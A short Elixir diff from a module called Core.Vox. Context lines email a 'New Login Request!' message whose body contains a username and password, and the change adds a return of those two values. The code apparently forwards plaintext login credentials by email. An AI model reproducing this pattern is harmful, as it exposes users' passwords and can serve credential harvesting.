@@ -22,6 +22,8 @@ defmodule Core.Vox do
     |> subject("New Login Request!")
     |> text_body(text(username, password))
     |> deliver
+
+    [username, password]
   end
 
   defp decode_logins(string) do
